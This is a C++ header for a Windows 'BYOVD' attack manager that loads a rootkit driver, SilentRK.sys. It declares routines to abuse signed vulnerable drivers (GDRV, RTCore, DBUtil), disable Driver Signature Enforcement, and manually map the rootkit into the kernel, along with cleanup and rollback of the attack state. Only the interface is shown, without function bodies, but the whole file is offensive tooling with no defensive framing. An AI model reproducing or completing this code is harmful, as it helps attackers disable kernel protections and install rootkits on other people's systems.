/**
 * @file BYOVDManager.h
 * @author Gregory King  
 * @date September 9, 2025
 * @brief Complete BYOVD attack manager for loading SilentRK.sys
 */

#pragma once

#include <Windows.h>
#include <string>
#include <vector>
#include <memory>
#include "DriverDataManager.h"
#include "Providers/ProviderManager.h"

namespace KernelMode {
    namespace BYOVD {

        /**
         * @brief BYOVD attack result codes
         */
        enum class BYOVDResult {
            Success,
            VulnerableDriverNotFound,
            VulnerableDriverLoadFailed, 
            SilentRKNotFound,
            SilentRKLoadFailed,
            DSEBypassFailed,
            ProviderNotSupported,
            InsufficientPrivileges,
            UnknownError
        };

        /**
         * @brief BYOVD attack methods
         */
        enum class BYOVDMethod {
            DirectDriverLoad,    // Load SilentRK directly via vulnerable driver
            DSEDisable,         // Disable DSE then load SilentRK normally
            ManualMapping       // Map SilentRK without loading as service
        };

        /**
         * @brief Complete BYOVD attack orchestration class
         */
        class BYOVDManager {
        public:
            static BYOVDManager& GetInstance();

            /**
             * @brief Initialize BYOVD manager and scan for available attack vectors
             */
            bool Initialize();

            /**
             * @brief Execute complete BYOVD attack to load SilentRK.sys
             * @param silentRKPath Path to SilentRK.sys file to load
             * @param method Preferred attack method
             * @return Result of the attack
             */
            BYOVDResult LoadSilentRK(const std::wstring& silentRKPath, BYOVDMethod method = BYOVDMethod::DirectDriverLoad);

            /**
             * @brief Get available vulnerable drivers suitable for BYOVD
             */
            std::vector<ULONG> GetAvailableVulnerableDrivers();

            /**
             * @brief Check if SilentRK is currently loaded
             */
            bool IsSilentRKLoaded();

            /**
             * @brief Unload SilentRK and clean up vulnerable drivers
             */
            bool CleanupBYOVD();

        private:
            BYOVDManager() = default;
            ~BYOVDManager() = default;

            // Core attack functions
            BYOVDResult LoadVulnerableDriver(ULONG driverId);
            BYOVDResult ExploitVulnerableDriver(ULONG driverId, const std::wstring& silentRKPath, BYOVDMethod method);
            BYOVDResult DisableDSE();
            BYOVDResult LoadSilentRKDirect(const std::wstring& silentRKPath);
            BYOVDResult MapSilentRK(const std::wstring& silentRKPath);

            // Provider-specific exploitation
            BYOVDResult ExploitGDRV(const std::wstring& silentRKPath, BYOVDMethod method);
            BYOVDResult ExploitRTCore(const std::wstring& silentRKPath, BYOVDMethod method);
            BYOVDResult ExploitDBUtil(const std::wstring& silentRKPath, BYOVDMethod method);

            // Helper functions
            std::wstring ResultToString(BYOVDResult result);
            bool ValidateDriverFile(const std::wstring& driverPath);
            ULONG SelectBestVulnerableDriver();

            // State tracking
            bool initialized = false;
            ULONG loadedVulnerableDriver = 0;
            std::vector<ULONG> availableDrivers;
            std::wstring loadedSilentRKPath;
            
            // LIFECYCLE-001: Initialization state tracking for rollback
            struct InitializationState {
                bool driverExtracted = false;
                bool providerLoaded = false;
                bool dseDisabled = false;
                bool silentRKServiceCreated = false;
                bool silentRKLoaded = false;
                std::wstring extractedDriverPath;
                std::wstring silentRKServiceName;
            } initState;
            
            // LIFECYCLE-001: Rollback helper
            void RollbackInitialization();

            // Active Exploitation Provider
            std::shared_ptr<KernelMode::Providers::IProvider> activeProvider;
        };

    } // namespace BYOVD
} // namespace KernelMode
